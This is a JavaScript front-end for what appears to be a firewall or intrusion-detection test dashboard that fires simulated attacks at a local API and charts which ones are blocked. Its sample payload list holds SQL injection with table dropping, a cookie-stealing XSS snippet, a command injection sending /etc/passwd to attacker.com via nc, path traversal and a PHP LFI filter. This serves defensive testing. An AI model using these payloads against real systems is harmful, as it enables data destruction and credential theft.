/**
 * simulator.js - Attack simulation logic
 */
'use strict';

let simTotal = 0, simBlocked = 0, simAmt = 0;
let simScores = [];
let demoChart = null;

const SAMPLE_PREVIEWS = {
  sqli: "' OR 1=1-- ; DROP TABLE users--",
  xss: "<img src=x onerror=alert(document.cookie)>",
  cmd_inject: "; cat /etc/passwd | nc attacker.com 4444",
  path_traversal: "../../../../etc/passwd",
  brute_force: "admin:password123 (repeated)",
  lfi: "php://filter/read=base64/resource=config.php",
  brt: "POST /login - 15 requests/sec",
  ddh: "GET / - 500 req/s flood",
};

document.addEventListener('DOMContentLoaded', () => {
  const sel = document.getElementById('attack-type');
  if (sel) { sel.addEventListener('change', updatePreview); updatePreview(); }
});

function updatePreview() {
  const t = document.getElementById('attack-type')?.value;
  const p = document.getElementById('payload-preview');
  if (p && t) p.textContent = SAMPLE_PREVIEWS[t] || '(custom payload)';
}

async function fireAttack() {
  const btn = document.getElementById('btn-fire');
  const type = document.getElementById('attack-type').value;
  const count = parseInt(document.getElementById('count-slider').value);
  const legit = document.getElementById('legit-toggle').checked;

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span> Firing...';

  const res = await safeFetch('/api/simulate', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({attack_type: type, count, legit})
  });

  btn.disabled = false;
  btn.innerHTML = '<i class="bi bi-lightning-fill me-2"></i>Fire Attack';

  if (!res || !res.results) { appendLine('Warning: Request failed', 'error'); return; }
  res.results.forEach(r => renderResult(r));
  updateStats(res.results, legit);
}

async function fireBurst() {
  appendLine('> [BURST] Launching DDoS simulation (20 requests)...', 'info');
  const res = await safeFetch('/api/simulate/burst', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({attack_type: 'ddos', burst: 20})
  });
  if (!res) { appendLine('Warning: Burst failed', 'error'); return; }
  const blocked = res.results.filter(r => r.action === 'block').length;
  appendLine(`> [BURST] Done: ${res.results.length} requests, ${blocked} blocked`, 'success');
}

async function runDemoSequence() {
  const btn = event.target;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span> Running...';
  appendLine('> [DEMO] Starting guided demo sequence...', 'info');

  const res = await safeFetch('/api/demo-sequence', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({})
  });

  btn.disabled = false;
  btn.innerHTML = '<i class="bi bi-play-circle me-2"></i>Run Demo Sequence';

  if (!res || !res.steps) { appendLine('Warning: Demo failed', 'error'); return; }

  res.steps.forEach((step, i) => {
    appendLine(
      `> [${i+1}] ${step.label} - ${step.count} reqs | blocked: ${step.blocked} | sensitivity: ${(step.sensitivity*100).toFixed(0)}%`,
      step.blocked > 0 ? 'blocked' : 'allowed'
    );
  });

  renderDemoChart(res.steps);
  document.getElementById('demo-results').classList.remove('d-none');
}

function renderResult(r) {
  const term = document.getElementById('sim-terminal');
  const line = document.createElement('div');
  line.className = 'sim-result-row';

  const color = r.blocked ? '#ff3860' : '#00ff00';
  const action = r.blocked ? 'BLOCKED' : 'ALLOWED';
  const payload = (r.payload || '').substring(0, 80);

  line.innerHTML = `<div style="display:flex;gap:8px;align-items:center;padding:3px 2px;border-bottom:1px solid rgba(255,255,255,0.03)">
    <span style="color:#3a4a5a;font-size:11px;flex-shrink:0">${new Date().toTimeString().slice(0,8)}</span>
    <span class="attack-badge badge-${r.attack_type || 'none'}">${(r.attack_type || 'none').toUpperCase()}</span>
    <span style="color:#7fb3d3;flex-shrink:0">${escH(r.ip)}</span>
    <span style="color:#888;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escH(r.payload)}">${escH(payload)}</span>
    <span style="color:#aaa">score:${r.threat_score.toFixed(2)}</span>
    <span style="color:#888">RL:${r.rl_action}</span>
    <span style="color:${color};font-weight:600">${action}</span>
  </div>
  <div style="padding:2px 2px 4px;font-size:11px;color:#555">
    ${escH(r.reason || '')} | reward:${r.reward.toFixed(2)} | rules:${(r.matched_rules||[]).slice(0,2).join(', ')||'none'}
  </div>`;

  const placeholder = term.querySelector('.terminal-welcome');
  if (placeholder) placeholder.remove();
  term.insertBefore(line, term.firstChild);
  while (term.children.length > 80) term.removeChild(term.lastChild);
}

function updateStats(results, isLegit) {
  simTotal += results.length;
  const blocked = results.filter(r => r.blocked).length;
  simAmt += results.length - blocked;
  if (!isLegit) simBlocked += blocked;
  results.forEach(r => simScores.push(r.threat_score));

  document.getElementById('sim-total').textContent = simTotal;
  const avg = simScores.length ? (simScores.reduce((a,b)=>a+b,0)/simScores.length) : 0;
  document.getElementById('sim-avg-score').textContent = avg.toFixed(3);

  const tp = results.filter(r => r.blocked && !isLegit).length;
  const fp = results.filter(r => r.blocked && isLegit).length;
  document.getElementById('sim-tp').textContent = parseInt(document.getElementById('sim-tp').textContent||0) + tp;
  document.getElementById('sim-fp').textContent = parseInt(document.getElementById('sim-fp').textContent||0) + fp;
  document.getElementById('sim-blocked-count').textContent = `${simBlocked} blocked`;
  document.getElementById('sim-allowed-count').textContent = `${simAmt} allowed`;
}

function renderDemoChart(steps) {
  const ctx = document.getElementById('demoChart');
  if (!ctx) return;
  if (demoChart) demoChart.destroy();

  demoChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: steps.map(s => s.label),
      datasets: [
        {label: 'Blocked', data: steps.map(s => s.blocked), backgroundColor: 'rgba(255,56,96,0.7)', borderColor: '#ff3860', borderWidth: 1},
        {label: 'Allowed', data: steps.map(s => s.allowed), backgroundColor: 'rgba(0,255,136,0.4)', borderColor: '#00ff88', borderWidth: 1},
        {label: 'Sensitivity%', data: steps.map(s => (s.sensitivity*100).toFixed(0)), type: 'line', borderColor: '#00d4ff', backgroundColor: 'transparent', pointRadius: 4, borderWidth: 2, yAxisId: 'y1'}
      ]
    },
    options: {
      responsive: true,
      scales: {
        x: {grid: {display: false}},
        y: {grid: {color: 'rgba(255,255,255,0.04)'}},
        y1: {position: 'right', min: 0, max: 100, grid: {display: false}, ticks: {callback: v => v + '%'}}
      }
    }
  });

  const table = document.getElementById('demo-steps-table');
  table.innerHTML = `<div class="demo-step-row" style="font-weight:600;color:#888;font-size:11px">
    <span>STEP</span><span>Count</span><span>Blocked</span><span>Allowed</span><span>Avg Score</span><span>Sensitivity</span>
  </div>
  ${steps.map((s,i) => `<div class="demo-step-row">
    <span>${i+1}. ${escH(s.label)}</span><span>${s.count}</span>
    <span style="color:#ff3860">${s.blocked}</span><span style="color:#00ff88">${s.allowed}</span>
    <span>${s.avg_score.toFixed(3)}</span><span style="color:#00d4ff">${(s.sensitivity*100).toFixed(0)}%</span>
  </div>`).join('')}`;
}

function appendLine(msg, type) {
  const term = document.getElementById('sim-terminal');
  const line = document.createElement('div');
  line.className = 'sim-result-row';
  const colors = {info:'#00d4ff', success:'#00ff88', blocked:'#ff3860', allowed:'#00ff88', error:'#ff3860'};
  const placeholder = term.querySelector('.terminal-welcome');
  if (placeholder) placeholder.remove();
  line.innerHTML = `<span style="color:${colors[type]||'#aaa'};font-size:12px;padding:2px 0;display:block">${escH(msg)}</span>`;
  term.insertBefore(line, term.firstChild);
}

function clearResults() {
  document.getElementById('sim-terminal').innerHTML = '';
  simTotal = simBlocked = simAmt = 0; simScores = [];
  ['sim-total','sim-tp','sim-fp'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = '0';
  });
  const avg = document.getElementById('sim-avg-score');
  if (avg) avg.textContent = '0.000';
  const bc = document.getElementById('sim-blocked-count');
  const ac = document.getElementById('sim-allowed-count');
  if (bc) bc.textContent = '0 blocked';
  if (ac) ac.textContent = '0 allowed';
}

async function safeFetch(url, opts) {
  try {
    const r = await fetch(url, opts);
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

function escH(s) {
  return String(s||'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
